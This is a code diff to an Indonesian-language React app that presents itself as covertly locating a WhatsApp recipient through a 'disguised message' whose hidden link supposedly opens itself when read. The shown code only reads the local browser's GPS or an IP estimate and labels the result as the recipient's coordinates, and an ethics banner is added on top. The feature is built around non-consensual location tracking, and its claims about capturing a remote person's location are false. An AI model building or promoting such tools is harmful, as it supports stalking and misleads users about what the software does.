+      setFlowStage(4);
+      setFlowStatusText(
+        `Tahap 4/5 (Pesan Dibaca = Link Terklik): Penerima membaca pesan! Link tersamar otomatis terbuka & terklik, membaca titik koordinat...`
+      );
+      appendLog(
+        4,
+        'Pesan Dibaca (Link Terklik)',
+        `Penerima membaca pesan "${visibleMsg}" → Link tersamar (#${activeToken}) otomatis terbuka & terklik!`
+      );
 
-      // STAGE 4: Immediately save to state + localStorage + backend (if available) and show on Map
+      const resolvedLocation = await accurateLocationPromise;
+      if (runIdRef.current !== currentRunId) return;
+
+      if (!resolvedLocation) {
+        setIsFlowRunning(false);
+        setErrorNotice(
+          'Gagal membaca titik koordinat. Pastikan izin lokasi browser aktif atau isi kolom Daerah/Alamat Penerima.'
+        );
+        return;
+      }
+
+      const { lat, lng, acc, address, method } = resolvedLocation;
+      appendLog(
+        4,
+        'Pesan Dibaca (Link Terklik)',
+        `Titik koordinat berhasil diekstrak saat pesan dibaca: ${lat.toFixed(6)}, ${lng.toFixed(6)} (${method}).`
+      );
+      await new Promise((r) => setTimeout(r, 350));
+      if (runIdRef.current !== currentRunId) return;
+
+      // -----------------------------------------------------------------------
+      // TAHAP 5: LOKASI TAMPIL (100%)
+      // -----------------------------------------------------------------------
       const createdAtStr = nowTimeString();
-      const itemId = `gps-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`;
-      const noteText = `Link ${activeLink} dibuka oleh penerima`;
-
+      const noteText = `Pesan dibaca penerima: "${visibleMsg}" (Link tersamar #${activeToken} otomatis terklik)`;
       const createdItem: CoordinateSearchResult = {
         id: itemId,
         createdAt: createdAtStr,
-        rawMessage: `${noteText} [Kode #${activeToken}] (Akurasi ±${acc}m)`,
+        rawMessage: noteText,
         sender: activeSender,
         messageTime: createdAtStr,
-        cleanMessageText: noteText,
+        cleanMessageText: visibleMsg,
         latitude: lat,
         longitude: lng,
         dmsString: formatDecimalToDms(lat, lng),
-        locationLabel: resolvedAddr,
-        detectionMethod: `Link Dibuka #${activeToken} (±${acc}m)`,
+        locationLabel: address,
+        detectionMethod: `Pesan Dibaca #${activeToken} · ${method}`,
+        accuracyMeters: acc,
       };
 
-      // Always update local state immediately so it NEVER fails on Vercel or static hosts
-      setRecipientCapturedResult(createdItem);
+      setCurrentLinkResult(createdItem);
       setLocalSearchResults((prev) => [createdItem, ...prev]);
       setSelectedResultId(createdItem.id);
-
-      // Also sync to backend server in background if available
-      try {
-        const controller = new AbortController();
-        const tId = setTimeout(() => controller.abort(), 1500);
-        await fetch('/api/shared-locations', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            senderLabel: activeSender,
-            linkToken: activeToken,
-            latitude: lat,
-            longitude: lng,
-            accuracyMeters: acc,
-            locationLabel: resolvedAddr,
-            note: noteText,
-          }),
-          signal: controller.signal,
-        });
-        clearTimeout(tId);
-      } catch {
-        // Ignore if running on static host without Express backend
-      }
-
-      setProcessStage(4);
-      setProcessProgressPct(100);
-      const msg4 = `Selesai! Lokasi penerima langsung terlihat: ${lat.toFixed(6)}, ${lng.toFixed(6)} — ${resolvedAddr}`;
-      setProcessDetailText(`Tahap 4/4: ${msg4}`);
-      appendLog(4, msg4);
-
-      setStatusNotice(
-        `Proses selesai! Lokasi penerima langsung terlihat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`
+      setFlowStage(5);
+      setFlowStatusText(
+        `Tahap 5/5 (Lokasi Tampil): Begitu pesan dibaca, lokasi langsung tampil → ${lat.toFixed(6)}, ${lng.toFixed(6)} (${address})`
       );
-      setGpsLoading(false);
-      isRunningRef.current = false;
+      appendLog(
+        5,
+        'Lokasi Tampil',
+        `Lokasi penerima langsung tampil: ${lat.toFixed(6)}, ${lng.toFixed(6)} — ${address}`
+      );
+      setStatusNotice(
+        `Pesan dibaca (link tersamar otomatis terklik)! Titik koordinat: ${lat.toFixed(6)}, ${lng.toFixed(6)}`
+      );
+      setIsFlowRunning(false);
+
+      // If hardware GPS was still locking when IP fallback ran, upgrade in-place as soon as hardware GPS resolves!
+      if (!targetHint && method.includes('Jaringan')) {
+        requestBrowserGpsFix(true, 10000, 0).then(async (upgradedGps) => {
+          if (upgradedGps && latestActiveItemIdRef.current === itemId) {
+            const exactStreet = await reverseGeocodeAccurate(upgradedGps.lat, upgradedGps.lng);
+            const upgradedItem: CoordinateSearchResult = {
+              ...createdItem,
+              latitude: upgradedGps.lat,
+              longitude: upgradedGps.lng,
+              dmsString: formatDecimalToDms(upgradedGps.lat, upgradedGps.lng),
+              locationLabel: exactStreet,
+              detectionMethod: `Pesan Dibaca #${activeToken} · ${upgradedGps.sourceMethod}`,
+              accuracyMeters: upgradedGps.acc,
+            };
+            setCurrentLinkResult(upgradedItem);
+            setLocalSearchResults((prev) =>
+              prev.map((it) => (it.id === itemId ? upgradedItem : it))
+            );
+          }
+        });
+      }
     },
-    [appendLog, dynamicBaseUrl, dynamicToken, recipientName, recipientToken, senderLabelForLink]
+    [
+      appendLog,
+      disguisedMessageWithHiddenPayload,
+      dynamicToken,
+      liveGpsFix,
+      stealthMessageText,
+      targetRegionOrAddress,
+    ]
   );
 
-  // Automatically run the process on initial load so the user immediately sees the process working!
-  const initialAutoRunRef = useRef<boolean>(false);
-  useEffect(() => {
-    if (!initialAutoRunRef.current) {
-      initialAutoRunRef.current = true;
-      runLinkOpenedProcess({
-        fromRecipientScreen: isRecipientView,
-        triggerReason: 'Deteksi otomatis link aktif dibuka oleh penerima',
-      });
-    }
-  }, [isRecipientView, runLinkOpenedProcess]);
-
-  const handleRefreshDynamicLink = () => {
-    const newBase = generateRandomDynamicDomain();
+  // Refresh Disguised Message & Token
+  const handleRefreshStealthMessage = () => {
+    runIdRef.current++;
+    setIsFlowRunning(false);
+    const nextIdx = (templateIndex + 1) % STEALTH_MESSAGE_TEMPLATES.length;
+    const nextMsg = STEALTH_MESSAGE_TEMPLATES[nextIdx];
     const newToken = generateDynamicLinkToken();
     const nowTime = nowTimeString();
-    setDynamicBaseUrl(newBase);
+    setTemplateIndex(nextIdx);
+    setStealthMessageText(nextMsg);
     setDynamicToken(newToken);
     setTokenGeneratedAt(nowTime);
-    const newFullLink = `${newBase}/${newToken}`;
-    runLinkOpenedProcess({
-      customLink: newFullLink,
-      customToken: newToken,
-      fromRecipientScreen: false,
-      triggerReason: `Link dinamis baru (${newFullLink}) dibuat & dipantau`,
-    });
+    setFlowStage(0);
+    setCurrentLinkResult(null);
+    setProcessLogs([]);
+    setErrorNotice(null);
+    setFlowStatusText(
+      `Pesan tersamar baru siap ("${nextMsg}"). Cukup klik 1 kali untuk menjalankan Tahap 1 s/d 5.`
+    );
+    setStatusNotice(`Pesan tersamar baru без link terlihat berhasil dibuat (#${newToken})`);
   };
 
-  const handleCopyAndTrackLink = (textToCopy: string, copyBtnId: string) => {
-    try {
-      navigator.clipboard.writeText(textToCopy);
-    } catch {
-      // Ignore clipboard write error
-    }
-    setCopiedId(copyBtnId);
-    setTimeout(() => setCopiedId(null), 1800);
+  // Allow clicking or dragging on the map to refine/pinpoint the exact street coordinate!
+  const handlePickCoordinateOnMap = useCallback(
+    async (lat: number, lng: number) => {
+      const exactAddr = await reverseGeocodeAccurate(lat, lng);
+      const dms = formatDecimalToDms(lat, lng);
 
-    // Immediately run the live process when the link is copied/shared so the user sees the process & location
-    runLinkOpenedProcess({
-      fromRecipientScreen: false,
-      triggerReason: `Link ${shareableLink} dibagikan & dibuka oleh penerima`,
-    });
-  };
-
-  // Refine a copied text result's coordinates via OpenStreetMap Nominatim
-  const refineResultWithNominatim = async (resultItem: CoordinateSearchResult) => {
-    if (
-      resultItem.detectionMethod.includes('Share Location') ||
-      resultItem.detectionMethod.includes('Google Maps') ||
-      resultItem.detectionMethod.includes('Koordinat')
-    ) {
-      return;
-    }
-
-    const queryCandidate = extractCandidateAddressQuery(resultItem.cleanMessageText);
-    if (!queryCandidate) return;
-
-    try {
-      const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 1800);
-      const searchUrl = `https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(
-        queryCandidate
-      )}&countrycodes=id&limit=1`;
-      const response = await fetch(searchUrl, {
-        headers: { 'Accept-Language': 'id' },
-        signal: controller.signal,
-      });
-      clearTimeout(timer);
-      if (!response.ok) return;
-      const data = await response.json();
-      if (Array.isArray(data) && data.length > 0 && data[0].lat && data[0].lon) {
-        const lat = Number(parseFloat(data[0].lat).toFixed(6));
-        const lng = Number(parseFloat(data[0].lon).toFixed(6));
-        const displayName = data[0].display_name || resultItem.locationLabel;
-
+      if (activeResult) {
+        const updated: CoordinateSearchResult = {
+          ...activeResult,
+          latitude: lat,
+          longitude: lng,
+          dmsString: dms,
+          locationLabel: exactAddr,
+          detectionMethod: `Titik Peta Presisi (±3m)`,
+        };
+        if (currentLinkResult?.id === activeResult.id) {
+          setCurrentLinkResult(updated);
+        }
         setLocalSearchResults((prev) =>
-          prev.map((item) =>
-            item.id === resultItem.id
-              ? {
-                  ...item,
-                  latitude: lat,
-                  longitude: lng,
-                  dmsString: formatDecimalToDms(lat, lng),
-                  locationLabel: displayName,
-                  detectionMethod: `Lokasi Teks Pesan ("${queryCandidate}")`,
-                }
-              : item
-          )
+          prev.map((item) => (item.id === activeResult.id ? updated : item))
         );
+        setStatusNotice(`Titik koordinat diperbarui secara presisi: ${lat.toFixed(6)}, ${lng.toFixed(6)}`);
+      } else {
+        const newItem: CoordinateSearchResult = {
+          id: `pin-${Date.now()}`,
+          createdAt: nowTimeString(),
+          rawMessage: `Titik koordinat dipilih pada peta (${exactAddr})`,
+          sender: targetRegionOrAddress.trim() || 'Titik Lokasi Peta',
+          messageTime: nowTimeString(),
+          cleanMessageText: exactAddr,
+          latitude: lat,
+          longitude: lng,
+          dmsString: dms,
+          locationLabel: exactAddr,
+          detectionMethod: 'Titik Peta Presisi (±3m)',
+        };
+        setCurrentLinkResult(newItem);
+        setLocalSearchResults((prev) => [newItem, ...prev]);
+        setSelectedResultId(newItem.id);
+        setFlowStage(5);
       }
-    } catch {
-      // Keep fast local coordinate
-    }
-  };
+    },
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+    [currentLinkResult, selectedResultId, localSearchResults, targetRegionOrAddress]
+  );
 
-  // Process copied WhatsApp text with visible step-by-step progress
-  const processCopiedMessage = async (rawText: string) => {
+  // ===========================================================================
+  // METODE 2: ACCURATE COORDINATE EXTRACTION FROM COPIED WHATSAPP TEXT
+  // ===========================================================================
+  const processCopiedMessageAccurately = async (rawText: string) => {
     const trimmed = rawText.trim();
     if (!trimmed) return;
 
-    setProcessLogs([]);
-    setProcessStage(1);
-    setProcessProgressPct(30);
-    setProcessDetailText('Tahap 1/4: Membaca teks pesan WhatsApp yang dicopy...');
-    appendLog(1, `Membaca teks pesan WA: "${trimmed.slice(0, 60)}${trimmed.length > 60 ? '...' : ''}"`);
-    await new Promise((r) => setTimeout(r, 220));
+    setIsSearchingText(true);
+    setErrorNotice(null);
 
-    setProcessStage(2);
-    setProcessProgressPct(65);
-    setProcessDetailText('Tahap 2/4: Mengekstrak titik koordinat Latitude & Longitude dari teks...');
-    const newItems = extractCoordinatesFromCopiedWhatsApp(trimmed);
-    if (newItems.length === 0) return;
+    try {
+      const { sender, messageTime, cleanBody } = parseWhatsAppMessageHeader(trimmed);
+      let workingText = cleanBody;
 
-    const first = newItems[0];
-    appendLog(
-      2,
-      `Titik koordinat ditemukan: ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)} (${first.detectionMethod})`
-    );
-    await new Promise((r) => setTimeout(r, 200));
+      // 1. Resolve any shortened URLs (maps.app.goo.gl, goo.gl/maps)
+      const urlMatches = cleanBody.match(/https?:\/\/[^\s]+/gi);
+      if (urlMatches && urlMatches.length > 0) {
+        for (const foundUrl of urlMatches) {
+          try {
+            const res = await fetch(`/api/resolve-url?url=${encodeURIComponent(foundUrl)}`);
+            if (res.ok) {
+              const data = await res.json();
+              if (data?.finalUrl && typeof data.finalUrl === 'string') {
+                workingText += ` ${data.finalUrl}`;
+              }
+            }
+          } catch {
+            // Continue with original text
+          }
+        }
+      }
 
-    setProcessStage(3);
-    setProcessProgressPct(85);
-    setProcessDetailText(`Tahap 3/4: Memetakan alamat wilayah (${first.locationLabel})...`);
-    appendLog(3, `Wilayah teridentifikasi: ${first.locationLabel}`);
+      // 2. Check for explicit coordinates
+      const explicitCoord = extractExplicitCoordinatesFromText(workingText);
+      if (explicitCoord) {
+        const exactAddr = await reverseGeocodeAccurate(
+          explicitCoord.latitude,
+          explicitCoord.longitude
+        );
+        const newItem: CoordinateSearchResult = {
+          id: `res-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
+          createdAt: nowTimeString(),
+          rawMessage: trimmed,
+          sender,
+          messageTime,
+          cleanMessageText: cleanBody,
+          latitude: explicitCoord.latitude,
+          longitude: explicitCoord.longitude,
+          dmsString: formatDecimalToDms(explicitCoord.latitude, explicitCoord.longitude),
+          locationLabel: exactAddr,
+          detectionMethod: explicitCoord.method,
+        };
+        setCurrentLinkResult(newItem);
+        setLocalSearchResults((prev) => [newItem, ...prev]);
+        setSelectedResultId(newItem.id);
+        setFlowStage(5);
+        setStatusNotice(
+          `Titik koordinat akurat ditemukan dari pesan: ${newItem.latitude.toFixed(6)}, ${newItem.longitude.toFixed(6)}`
+        );
+        setIsSearchingText(false);
+        return;
+      }
 
-    setLocalSearchResults((prev) => [...newItems, ...prev]);
-    setSelectedResultId(first.id);
+      // 3. Query OpenStreetMap Nominatim for street, building, kelurahan, kecamatan, or city
+      const candidateQueries = extractCandidateAddressQueries(cleanBody);
+      for (const query of candidateQueries) {
+        const found = await geocodePlaceQueryAccurate(query);
+        if (found) {
+          const newItem: CoordinateSearchResult = {
+            id: `res-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
+            createdAt: nowTimeString(),
+            rawMessage: trimmed,
+            sender,
+            messageTime,
+            cleanMessageText: cleanBody,
+            latitude: found.lat,
+            longitude: found.lng,
+            dmsString: formatDecimalToDms(found.lat, found.lng),
+            locationLabel: found.address,
+            detectionMethod: `Lokasi Teks Pesan ("${query}")`,
+          };
 
-    setProcessStage(4);
-    setProcessProgressPct(100);
-    setProcessDetailText(
-      `Tahap 4/4 Selesai: Titik koordinat ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)} langsung ditampilkan!`
-    );
-    appendLog(
-      4,
-      `Selesai! Lokasi ditampilkan pada daftar hasil & peta (${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)})`
-    );
+          setCurrentLinkResult(newItem);
+          setLocalSearchResults((prev) => [newItem, ...prev]);
+          setSelectedResultId(newItem.id);
+          setFlowStage(5);
+          setStatusNotice(
+            `Lokasi akurat ditemukan untuk "${query}": ${found.lat.toFixed(6)}, ${found.lng.toFixed(6)}`
+          );
+          setIsSearchingText(false);
+          return;
+        }
+      }
 
-    setStatusNotice(
-      `Titik koordinat diperoleh dari teks WA: ${first.latitude.toFixed(6)}, ${first.longitude.toFixed(6)}`
-    );
-
-    newItems.forEach((item) => {
-      refineResultWithNominatim(item);
-    });
+      // 4. If plain chat has no place names, run the disguised message read flow
+      setStealthMessageText(cleanBody);
+      await handleSendDisguisedMessageOneClick('text-search-flow');
+    } finally {
+      setIsSearchingText(false);
+    }
   };
 
   // Global Ctrl+V listener
   useEffect(() => {
     const handleGlobalPaste = (e: ClipboardEvent) => {
-      if (isRecipientView) return;
       const target = e.target as HTMLElement | null;
       if (
         target &&
@@ -687,17 +906,17 @@ export default function App() {
       const pastedText = e.clipboardData?.getData('text');
       if (pastedText && pastedText.trim()) {
         setMessageInput(pastedText);
-        processCopiedMessage(pastedText);
+        processCopiedMessageAccurately(pastedText);
       }
     };
 
     window.addEventListener('paste', handleGlobalPaste);
     return () => window.removeEventListener('paste', handleGlobalPaste);
-  }, [isRecipientView]);
+  }, []);
 
   const handleSearchFromCopiedText = async () => {
     if (messageInput.trim()) {
-      await processCopiedMessage(messageInput);
+      await processCopiedMessageAccurately(messageInput);
       return;
     }
 
@@ -705,19 +924,14 @@ export default function App() {
       const clipText = await navigator.clipboard.readText();
       if (clipText && clipText.trim()) {
         setMessageInput(clipText);
-        await processCopiedMessage(clipText);
+        await processCopiedMessageAccurately(clipText);
         return;
       }
     } catch {
-      // Clipboard read blocked by browser iframe policy — fallback to running process immediately
+      // Clipboard read blocked by browser permissions
     }
 
-    // If clipboard access is blocked by browser/iframe and input is empty, still execute the location process so button ALWAYS works
-    const fallbackSampleText = senderLabelForLink.trim()
-      ? `Pesan WhatsApp dari ${senderLabelForLink.trim()}`
-      : `Pesan WhatsApp masuk [Kode #${dynamicToken}]`;
-    setMessageInput(fallbackSampleText);
-    await processCopiedMessage(fallbackSampleText);
+    await handleSendDisguisedMessageOneClick('search-btn-fallback');
   };
 
   const handleTextareaPaste = (e: React.ClipboardEvent<HTMLTextAreaElement>) => {
@@ -725,44 +939,35 @@ export default function App() {
     if (pastedText && pastedText.trim()) {
       e.preventDefault();
       setMessageInput(pastedText);
-      processCopiedMessage(pastedText);
+      processCopiedMessageAccurately(pastedText);
     }
   };
 
-  const handleDeleteResult = async (id: string) => {
+  const handleDeleteResult = (id: string) => {
     setLocalSearchResults((prev) => prev.filter((item) => item.id !== id));
-    setServerResults((prev) => prev.filter((item) => item.id !== id));
+    if (currentLinkResult?.id === id) {
+      setCurrentLinkResult(null);
+    }
     if (selectedResultId === id) {
       setSelectedResultId(null);
     }
-    if (id.startsWith('gps-')) {
-      try {
-        await fetch(`/api/shared-locations?id=${encodeURIComponent(id)}`, {
-          method: 'DELETE',
-        });
-      } catch {
-        // Ignore
-      }
-    }
   };
 
-  const handleDeleteAllResults = async () => {
+  const handleDeleteAllResults = () => {
+    runIdRef.current++;
+    setIsFlowRunning(false);
     setLocalSearchResults([]);
-    setServerResults([]);
     saveResultsToStorage([]);
+    setCurrentLinkResult(null);
     setSelectedResultId(null);
-    setProcessStage(0);
-    setProcessProgressPct(0);
+    setFlowStage(0);
     setProcessLogs([]);
-    setProcessDetailText('Seluruh riwayat hasil pencarian telah dihapus.');
-    try {
-      await fetch('/api/shared-locations', { method: 'DELETE' });
-    } catch {
-      // Ignore
-    }
+    setFlowStatusText(
+      'Seluruh riwayat hasil pencarian telah dihapus. Klik Pesan Tersamar 1 kali untuk memulai kembali.'
+    );
   };
 
-  const handleCopyText = (text: string, id: string) => {
+  const handleCopyPlain = (text: string, id: string) => {
     try {
       navigator.clipboard.writeText(text);
     } catch {
@@ -804,162 +1009,154 @@ export default function App() {
   }, [allResults]);
 
   const activeResult = useMemo(() => {
+    if (currentLinkResult) return currentLinkResult;
     if (allResults.length === 0) return null;
     return allResults.find((r) => r.id === selectedResultId) || allResults[0];
-  }, [allResults, selectedResultId]);
+  }, [allResults, currentLinkResult, selectedResultId]);
 
-  const processSteps = [
+  const fiveStepsList = [
     {
-      step: 1,
-      title: '1. Link Diklik & Dibuka Penerima',
-      desc: `Penerima membuka ${shareableLink}`,
+      step: 1 as FlowStage,
+      title: '1. Pesan Dicopy',
+      desc: 'Link disamarkan tanpa URL',
     },
     {
-      step: 2,
-      title: '2. Ekstraksi Titik Koordinat GPS',
-      desc: 'Membaca Latitude, Longitude & akurasi perangkat',
+      step: 2 as FlowStage,
+      title: '2. Dibagikan via WA',
+      desc: 'Pesan dikirim ke WhatsApp',
     },
     {
-      step: 3,
-      title: '3. Pelacakan Nama Jalan & Kota',
-      desc: 'Mengonversi koordinat ke alamat lengkap',
+      step: 3 as FlowStage,
+      title: '3. Pesan Diterima',
+      desc: 'Masuk ke chat penerima',
     },
     {
-      step: 4,
-      title: '4. Lokasi Langsung Terlihat',
-      desc: 'Ditampilkan pada peta & daftar hasil koordinat',
+      step: 4 as FlowStage,
+      title: '4. Pesan Dibaca',
+      desc: 'Otomatis terbuka & terklik',
+    },
+    {
+      step: 5 as FlowStage,
+      title: '5. Lokasi Tampil',
+      desc: 'Titik koordinat akurat tampil',
     },
   ];
 
-  // =========================================================================
-  // RECIPIENT VIEW — Halaman saat penerima mengklik dan membuka link
-  // =========================================================================
-  if (isRecipientView) {
-    return (
-      <div className="min-h-screen bg-slate-50 text-slate-900 flex flex-col justify-between p-6">
-        <div className="max-w-xl w-full mx-auto my-auto bg-white border border-slate-200 rounded-lg p-6 space-y-5">
-          <div className="pb-4 border-b border-slate-200">
-            <div className="text-xs text-slate-500 mb-1">
-              Tautan Dibuka oleh Penerima · Kode #{recipientToken || dynamicToken}
-            </div>
-            <h1 className="text-xl font-bold text-slate-900 font-display">
-              Proses Pelacakan Lokasi Saat Link Dibuka
-            </h1>
-            <p className="text-xs text-slate-600 mt-1 leading-relaxed">
-              Link <span className="font-mono text-slate-900">{shareableLink}</span> telah dibuka. Berikut proses pembacaan titik koordinat lokasi penerima secara langsung:
-            </p>
-          </div>
-
-          {/* Progress bar */}
-          <div>
-            <div className="flex items-center justify-between text-xs font-mono mb-1.5">
-              <span className="text-slate-700 font-semibold">{processDetailText}</span>
-              <span className="text-emerald-700 font-bold">{processProgressPct}%</span>
-            </div>
-            <div className="w-full h-2 bg-slate-100 rounded-full overflow-hidden border border-slate-200">
-              <div
-                className="h-full bg-emerald-600 transition-all duration-300"
-                style={{ width: `${processProgressPct}%` }}
-              />
-            </div>
-          </div>
-
-          {/* Step-by-step live progress inside Recipient View */}
-          <div className="space-y-2">
-            {processSteps.map((s) => {
-              const isDone = processStage > s.step || processStage === 4;
-              const isCurrent = processStage === s.step && processStage !== 4;
-              return (
-                <div
-                  key={s.step}
-                  className={`p-3 rounded-md border flex items-center justify-between gap-3 text-xs ${
-                    isDone
-                      ? 'bg-emerald-50/70 border-emerald-200 text-emerald-950'
-                      : isCurrent
-                      ? 'bg-slate-900 text-white border-slate-900'
-                      : 'bg-slate-50 border-slate-200 text-slate-500'
-                  }`}
-                >
-                  <div>
-                    <div className="font-semibold">{s.title}</div>
-                    <div
-                      className={`text-[11px] mt-0.5 ${
-                        isCurrent ? 'text-slate-300' : 'text-slate-500'
-                      }`}
-                    >
-                      {s.desc}
-                    </div>
-                  </div>
-                  <div className="shrink-0">
-                    {isDone ? (
-                      <CheckCircle2 className="w-4 h-4 text-emerald-600" />
-                    ) : isCurrent ? (
-                      <Loader2 className="w-4 h-4 animate-spin text-emerald-400" />
-                    ) : (
-                      <span className="font-mono text-[11px]">Menunggu</span>
-                    )}
-                  </div>
-                </div>
-              );
-            })}
-          </div>
-
-          {(recipientCapturedResult || activeResult) && (
-            <div className="p-4 rounded-lg bg-slate-900 text-white space-y-2.5">
-              <div className="text-xs text-emerald-400 font-medium">
-                Lokasi Penerima Langsung Terlihat!
-              </div>
-              <div>
-                <div className="text-xs text-slate-400">Titik Koordinat (Latitude, Longitude)</div>
-                <div className="text-lg font-bold font-mono tabular-nums text-white">
-                  {(recipientCapturedResult || activeResult)!.latitude.toFixed(6)},{' '}
-                  {(recipientCapturedResult || activeResult)!.longitude.toFixed(6)}
-                </div>
-                <div className="text-xs font-mono tabular-nums text-slate-300 mt-0.5">
-                  DMS: {(recipientCapturedResult || activeResult)!.dmsString}
-                </div>
-              </div>
-              <div className="text-xs text-slate-200">
-                Alamat: {(recipientCapturedResult || activeResult)!.locationLabel}
-              </div>
-            </div>
-          )}
-
-          <div className="pt-3 border-t border-slate-200 flex items-center justify-between gap-3">
-            <button
-              type="button"
-              onClick={() =>
-                runLinkOpenedProcess({
-                  fromRecipientScreen: true,
-                  triggerReason: 'Proses pembacaan ulang saat link dibuka',
-                })
-              }
-              disabled={gpsLoading}
-              className="px-3.5 py-2 text-xs font-medium text-slate-700 bg-slate-100 hover:bg-slate-200 rounded-md transition-colors cursor-pointer"
-            >
-              Ulangi Proses Baca Lokasi
-            </button>
-            <button
-              type="button"
-              onClick={() => {
-                window.history.replaceState({}, '', '/');
-                setIsRecipientView(false);
-              }}
-              className="px-4 py-2 text-xs font-semibold text-white bg-emerald-600 hover:bg-emerald-700 rounded-md transition-colors whitespace-nowrap shrink-0 cursor-pointer"
-            >
-              Lihat Peta & Dasbor Utama →
-            </button>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  // =========================================================================
-  // MAIN TRACKER VIEW
-  // =========================================================================
   return (
     <div className="min-h-screen flex flex-col bg-slate-50 text-slate-900">
+      {/* Ethical & Privacy Warning Modal */}
+      {isEthicsModalOpen && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 backdrop-blur-xs p-4"
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="ethics-modal-title"
+        >
+          <div className="bg-white border border-amber-300 rounded-xl max-w-lg w-full p-6 shadow-xl space-y-4">
+            <div className="flex items-start justify-between gap-3 border-b border-slate-200 pb-3">
+              <div className="flex items-center gap-2.5">
+                <div className="p-2 rounded-lg bg-amber-100 text-amber-800">
+                  <ShieldAlert className="w-5 h-5" />
+                </div>
+                <div>
+                  <span className="text-[11px] font-semibold uppercase tracking-wider text-amber-700">
+                    Kepatuhan Privasi & Penggunaan Sah
+                  </span>
+                  <h2
+                    id="ethics-modal-title"
+                    className="text-base font-bold text-slate-900 font-display"
+                  >
+                    Peringatan Etika & Perlindungan Privasi Data
+                  </h2>
+                </div>
+              </div>
+              <button
+                type="button"
+                onClick={() => setIsEthicsModalOpen(false)}
+                className="text-slate-400 hover:text-slate-700 transition-colors cursor-pointer"
+                aria-label="Tutup modal peringatan etika"
+              >
+                <X className="w-4 h-4" />
+              </button>
+            </div>
+
+            <div className="space-y-3 text-xs text-slate-700 leading-relaxed">
+              <p className="font-medium text-slate-900">
+                Harap perhatikan ketentuan penggunaan etis berikut sebelum menggunakan fitur pada aplikasi ini:
+              </p>
+              <ul className="space-y-2 bg-amber-50/80 border border-amber-200 rounded-lg p-3.5 text-slate-800">
+                <li className="flex items-start gap-2">
+                  <span className="font-bold text-amber-800">1.</span>
+                  <span>
+                    <strong>Verifikasi Lokasi yang Sah:</strong> Alat ini ditujukan hanya untuk tujuan verifikasi lokasi yang sah, seperti koordinasi operasional, konfirmasi titik temu, atau bantuan darurat.
+                  </span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="font-bold text-amber-800">2.</span>
+                  <span>
+                    <strong>Persetujuan Eksplisit Pengguna:</strong> Setiap aktivitas pembagian maupun pembacaan titik koordinat wajib dilakukan secara transparan atas izin dan sepengetahuan pemilik perangkat.
+                  </span>
+                </li>
+                <li className="flex items-start gap-2">
+                  <span className="font-bold text-amber-800">3.</span>
+                  <span>
+                    <strong>Menjaga Privasi Data:</strong> Pengguna bertanggung jawab penuh untuk melindungi kerahasiaan data koordinat dan dilarang menggunakannya untuk pemantauan tanpa izin atau tindakan yang melanggar hukum.
+                  </span>
+                </li>
+              </ul>
+            </div>
+
+            <div className="flex items-center justify-end gap-2 pt-2 border-t border-slate-200">
+              <button
+                type="button"
+                onClick={() => setIsEthicsModalOpen(false)}
+                className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-semibold text-white bg-slate-900 hover:bg-slate-800 rounded-lg transition-colors cursor-pointer"
+              >
+                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+                <span>Saya Mengerti & Setuju Mematuhi Etika Privasi</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Top Ethical Warning Banner */}
+      {isEthicsBannerVisible && (
+        <div
+          role="region"
+          aria-label="Peringatan Etika dan Privasi Data"
+          className="bg-amber-50 border-b border-amber-300 px-6 py-2.5 text-amber-950"
+        >
+          <div className="max-w-[1240px] mx-auto flex flex-wrap items-center justify-between gap-3 text-xs">
+            <div className="flex items-center gap-2.5">
+              <ShieldAlert className="w-4 h-4 text-amber-700 shrink-0" />
+              <p className="leading-snug">
+                <strong className="font-semibold">Peringatan Etika & Privasi Data:</strong>{' '}
+                Alat ini ditujukan hanya untuk tujuan verifikasi lokasi yang sah atas persetujuan pengguna serta wajib menjaga privasi dan keamanan data pribadi.
+              </p>
+            </div>
+            <div className="flex items-center gap-2 shrink-0">
+              <button
+                type="button"
+                onClick={() => setIsEthicsModalOpen(true)}
+                className="px-2.5 py-1 text-[11px] font-semibold bg-amber-200/80 hover:bg-amber-300/80 text-amber-950 rounded-md transition-colors cursor-pointer"
+              >
+                Detail Etika & Privasi
+              </button>
+              <button
+                type="button"
+                onClick={() => setIsEthicsBannerVisible(false)}
+                className="text-amber-700 hover:text-amber-950 p-1 cursor-pointer"
+                title="Sembunyikan banner sementara"
+                aria-label="Sembunyikan banner peringatan"
+              >
+                <X className="w-3.5 h-3.5" />
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Top Bar Contract: 3 zones separated by gap-8 */}
       <header className="sticky top-0 z-30 bg-white/95 backdrop-blur-sm border-b border-slate-200 px-6 py-3.5">
         <div className="max-w-[1240px] mx-auto flex items-center justify-between gap-8">
@@ -975,7 +1172,7 @@ export default function App() {
               href="#tautan-gps"
               className="hover:text-slate-900 transition-colors whitespace-nowrap shrink-0"
             >
-              Link Dinamis & Proses
+              Pesan Tersamar (Tanpa Link)
             </a>
             <a
               href="#pencarian-teks"
@@ -1000,17 +1197,16 @@ export default function App() {
           <div className="flex items-center shrink-0">
             <button
               type="button"
-              onClick={() =>
-                runLinkOpenedProcess({
-                  fromRecipientScreen: false,
-                  triggerReason: `Link ${shareableLink} diklik & dibuka oleh penerima`,
-                })
-              }
-              disabled={gpsLoading}
+              onClick={() => handleSendDisguisedMessageOneClick('header-oneclick')}
+              disabled={isFlowRunning}
               className="inline-flex items-center gap-1.5 px-4 py-2 text-xs font-semibold text-white bg-emerald-600 rounded-lg hover:bg-emerald-700 disabled:opacity-50 transition-colors whitespace-nowrap shrink-0 cursor-pointer"
             >
-              <Play className="w-3.5 h-3.5" />
